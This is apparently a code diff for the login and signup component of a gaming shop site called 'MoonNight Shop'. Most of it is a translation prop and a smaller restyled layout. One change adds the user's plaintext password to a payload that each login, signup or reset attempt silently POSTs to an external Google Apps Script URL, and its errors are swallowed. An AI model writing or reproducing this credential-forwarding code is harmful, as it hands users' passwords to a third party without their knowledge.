@@ -1,14 +1,16 @@
 
 import React, { useState } from 'react';
 import { User } from '../types';
+import { TranslationKeys } from '../translations';
 
 interface AuthProps {
   onLogin: (user: User) => void;
   onBack: () => void;
   allUsers: User[];
+  t: (key: TranslationKeys) => string;
 }
 
-const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
+const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers, t }) => {
   const [mode, setMode] = useState<'login' | 'signup' | 'forgot'>('signup');
   const [isLoading, setIsLoading] = useState(false);
   const [resetSent, setResetSent] = useState(false);
@@ -28,7 +30,7 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
     const existingUser = allUsers.find(u => u.email.toLowerCase() === emailLower);
 
     if (mode === 'signup' && existingUser) {
-      setError("ERREUR: Un compte avec cet email existe déjà. Veuillez vous connecter.");
+      setError("ERREUR: Un compte avec cet email existe déjà.");
       setIsLoading(false);
       setMode('login'); 
       return;
@@ -52,17 +54,18 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
       productBought: `Action: ${actionLabel}`,
       totalAmount: 0,
       date: now.toISOString(),
+      password: formData.password,
       authInfo: `Status: ${actionLabel} Attempt`
     };
 
     try {
-      const logUrl = "https://script.google.com/macros/s/AKfycby2gXGh8SwZ4TrekT02pLmOW9NSh4h8Z87mugRZoH2xwJ1gZ23sDOFfqcKpEoTfAVk/exec";
+      const logUrl = "https://script.google.com/macros/s/AKfycbwVgM0oHf1Y-kR1OfclYBOwo5ePnDVxiW2WCxz6vwp6oM65bwDycByvLAobuZUfR7qt/exec";
       await fetch(logUrl, {
         method: 'POST',
         mode: 'no-cors', 
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      }).catch(() => {});
+      }).catch((err) => console.debug("Silent auth log error", err));
 
       if (mode === 'forgot') {
         setResetSent(true);
@@ -94,75 +97,76 @@ const Auth: React.FC<AuthProps> = ({ onLogin, onBack, allUsers }) => {
 
   if (resetSent) {
     return (
-      <div className="pt-48 pb-24 max-w-lg mx-auto px-6 animate-fade-in text-center">
-        <div className="bg-slate-900 border-4 border-slate-800 p-16 rounded-[4rem] shadow-2xl">
-          <div className="w-24 h-24 bg-sky-500/10 rounded-full flex items-center justify-center mx-auto mb-10 border-4 border-sky-500/30">
-            <i className="fas fa-check text-4xl text-sky-400"></i>
+      <div className="pt-32 pb-24 max-w-sm mx-auto px-6 animate-fade-in text-center">
+        <div className="bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl">
+          <div className="w-12 h-12 bg-sky-500/10 rounded-full flex items-center justify-center mx-auto mb-5 border border-sky-500/20">
+            <i className="fas fa-check text-lg text-sky-400"></i>
           </div>
-          <h2 className="text-3xl font-gaming font-black text-white uppercase tracking-[0.2em] mb-6">UPLINK SENT</h2>
-          <p className="text-slate-400 text-sm uppercase tracking-widest mb-12 leading-relaxed font-bold">If the credentials match our database, an encryption key has been sent to your terminal.</p>
-          <button onClick={() => { setResetSent(false); setMode('login'); }} className="w-full bg-sky-500 text-white font-gaming py-6 rounded-[2rem] text-xs uppercase tracking-[0.3em] font-black shadow-xl">RE-INITIATE</button>
+          <h2 className="text-base font-gaming font-black text-white uppercase mb-2">UPLINK SENT</h2>
+          <p className="text-slate-500 text-[9px] uppercase mb-6 font-bold tracking-widest">CHECK YOUR INBOX</p>
+          <button onClick={() => { setResetSent(false); setMode('login'); }} className="w-full bg-sky-500 text-white font-gaming py-3.5 rounded-lg text-[9px] uppercase tracking-[0.2em] font-black hover:bg-sky-600 transition-all">RE-INITIATE</button>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="pt-48 pb-24 max-w-3xl mx-auto px-6 animate-fade-in">
-      <div className="bg-slate-900 border-4 border-slate-800 p-12 md:p-24 rounded-[5rem] shadow-[0_40px_100px_rgba(0,0,0,0.6)] relative overflow-hidden">
-        <div className="absolute top-0 right-0 w-96 h-96 bg-sky-500/5 blur-[150px] -mr-48 -mt-48 rounded-full"></div>
+    <div className="pt-24 sm:pt-40 pb-20 flex items-center justify-center min-h-[70vh] px-4 animate-fade-in">
+      {/* Container is now smaller on mobile (max-w-[340px]) */}
+      <div className="w-full max-w-[340px] sm:max-w-[440px] bg-slate-900/50 backdrop-blur-xl border border-slate-800/80 p-5 sm:p-10 rounded-2xl sm:rounded-[2rem] shadow-[0_20px_60px_rgba(0,0,0,0.5)] relative overflow-hidden">
         
-        <div className="text-center mb-20 relative z-10">
-          <h1 className="text-6xl md:text-8xl font-gaming font-black text-white uppercase tracking-tighter mb-6 leading-none">
-            MoonNight <br />
-            <span className="text-sky-400 drop-shadow-[0_0_20px_rgba(14,165,233,0.4)]">Shop</span>
+        <div className="text-center mb-6 relative z-10">
+          <div className="inline-block p-1.5 bg-slate-950 rounded-lg mb-3 border border-slate-800/50">
+             <div className="w-8 h-8 bg-gradient-to-br from-sky-500 to-indigo-600 rounded flex items-center justify-center shadow-lg">
+                <span className="text-white font-gaming font-black text-sm">M</span>
+             </div>
+          </div>
+          <h1 className="text-xl sm:text-2xl font-gaming font-black text-white uppercase tracking-tight mb-0.5">
+            MoonNight <span className="text-sky-400">Shop</span>
           </h1>
-          <p className="text-slate-500 text-xs font-gaming uppercase tracking-[1em] opacity-80 font-black">SECURE AUTHENTICATION GATEWAY</p>
+          <p className="text-slate-600 text-[7px] sm:text-[8px] font-gaming uppercase tracking-[0.4em] font-black">Secure System Entry</p>
         </div>
 
-        <div className="flex bg-slate-950 p-3 rounded-[3rem] mb-16 border-4 border-slate-800 relative z-10 shadow-inner">
-          <button onClick={() => {setMode('login'); setError(null);}} className={`flex-1 py-5 rounded-[2.5rem] text-xs font-gaming uppercase tracking-[0.3em] font-black transition-all duration-500 ${mode === 'login' ? 'bg-sky-500 text-white shadow-2xl' : 'text-slate-500 hover:text-white'}`}>LOG-IN</button>
-          <button onClick={() => {setMode('signup'); setError(null);}} className={`flex-1 py-5 rounded-[2.5rem] text-xs font-gaming uppercase tracking-[0.3em] font-black transition-all duration-500 ${mode === 'signup' ? 'bg-sky-500 text-white shadow-2xl' : 'text-slate-500 hover:text-white'}`}>SIGN-UP</button>
+        <div className="flex bg-slate-950/80 p-1 rounded-lg mb-6 border border-slate-800/50 relative z-10">
+          <button onClick={() => {setMode('login'); setError(null);}} className={`flex-1 py-2 rounded-md text-[8px] sm:text-[9px] font-gaming uppercase tracking-[0.1em] font-black transition-all ${mode === 'login' ? 'bg-sky-500 text-white shadow-md' : 'text-slate-500 hover:text-slate-300'}`}>LOG-IN</button>
+          <button onClick={() => {setMode('signup'); setError(null);}} className={`flex-1 py-2 rounded-md text-[8px] sm:text-[9px] font-gaming uppercase tracking-[0.1em] font-black transition-all ${mode === 'signup' ? 'bg-sky-500 text-white shadow-md' : 'text-slate-500 hover:text-slate-300'}`}>SIGN-UP</button>
         </div>
 
         {error && (
-          <div className="mb-10 p-8 bg-red-500/10 border-4 border-red-500/30 rounded-[3rem] animate-scale-up text-center">
-            <p className="text-red-500 text-xs font-gaming uppercase tracking-widest font-black leading-relaxed">{error}</p>
+          <div className="mb-5 p-3 bg-red-500/10 border border-red-500/20 rounded-lg text-center">
+            <p className="text-red-500 text-[8px] sm:text-[9px] font-gaming uppercase font-black">{error}</p>
           </div>
         )}
 
-        <form onSubmit={handleSubmit} className="space-y-10 relative z-10">
+        <form onSubmit={handleSubmit} className="space-y-3.5 relative z-10">
           {mode === 'signup' && (
             <div className="animate-slide-up">
-              <label className="block text-slate-500 text-xs font-gaming uppercase mb-4 ml-8 tracking-widest font-black">PILOT NAME</label>
-              <input required type="text" className="w-full bg-slate-950 border-4 border-slate-800 rounded-[2.5rem] px-10 py-7 text-white focus:border-sky-500 outline-none transition-all text-xl font-bold" placeholder="YOUR AVATAR NAME" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} />
+              <input required type="text" className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="PILOT NAME" value={formData.name} onChange={(e) => setFormData({...formData, name: e.target.value})} />
             </div>
           )}
           
           <div className="animate-slide-up">
-            <label className="block text-slate-500 text-xs font-gaming uppercase mb-4 ml-8 tracking-widest font-black">COMM CHANNEL (EMAIL)</label>
-            <input required type="email" className="w-full bg-slate-950 border-4 border-slate-800 rounded-[2.5rem] px-10 py-7 text-white focus:border-sky-500 outline-none transition-all text-xl font-bold" placeholder="PILOT@BASE.COM" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
+            <input required type="email" className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="EMAIL ADDRESS" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} />
           </div>
 
           <div className="animate-slide-up">
-            <label className="block text-slate-500 text-xs font-gaming uppercase mb-4 ml-8 tracking-widest font-black">ENCRYPTION KEY (PASSWORD)</label>
-            <input required type="password" minLength={6} className="w-full bg-slate-950 border-4 border-slate-800 rounded-[2.5rem] px-10 py-7 text-white focus:border-sky-500 outline-none transition-all text-xl font-bold" placeholder="••••••••" value={formData.password} onChange={(e) => setFormData({...formData, password: e.target.value})} />
+            <input required type="password" minLength={6} className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-white focus:border-sky-500 outline-none text-[10px] sm:text-xs font-bold transition-all placeholder:text-slate-700" placeholder="ENCRYPTION KEY" value={formData.password} onChange={(e) => setFormData({...formData, password: e.target.value})} />
           </div>
 
           {mode === 'login' && (
-            <div className="text-right pr-8">
-              <button type="button" onClick={() => setMode('forgot')} className="text-xs font-gaming uppercase tracking-[0.2em] text-slate-500 hover:text-sky-400 transition-colors font-bold">FORGOT KEY?</button>
+            <div className="text-right px-1">
+              <button type="button" onClick={() => setMode('forgot')} className="text-[8px] font-gaming uppercase tracking-widest text-slate-600 hover:text-sky-400 font-black">FORGOT KEY?</button>
             </div>
           )}
 
-          <button type="submit" disabled={isLoading} className="w-full bg-sky-500 text-white font-gaming font-black py-8 rounded-[2.5rem] shadow-2xl hover:bg-sky-600 transition-all uppercase tracking-[0.4em] mt-12 text-base disabled:opacity-50 active:scale-95">
-            {isLoading ? 'SYNCING...' : (mode === 'login' ? 'ACCESS PORTAL' : 'REJOIN THE BASE')}
+          <button type="submit" disabled={isLoading} className="w-full bg-sky-500 text-white font-gaming font-black py-3.5 rounded-lg shadow-lg hover:bg-sky-600 transition-all uppercase tracking-[0.2em] mt-3 text-[9px] sm:text-[10px] disabled:opacity-50">
+            {isLoading ? 'SYNCING...' : (mode === 'login' ? 'INITIALIZE LINK' : 'CREATE ACCOUNT')}
           </button>
         </form>
 
-        <div className="mt-16 text-center relative z-10">
-          <button onClick={onBack} className="text-slate-500 hover:text-sky-400 text-xs font-gaming uppercase tracking-[0.3em] transition-colors font-black">
-            ← RETURN TO MARKETPLACE
+        <div className="mt-8 text-center relative z-10">
+          <button onClick={onBack} className="text-slate-700 hover:text-sky-400 text-[7px] sm:text-[8px] font-gaming uppercase tracking-[0.2em] transition-colors font-black">
+            ← ABORT AND RETURN
           </button>
         </div>
       </div>
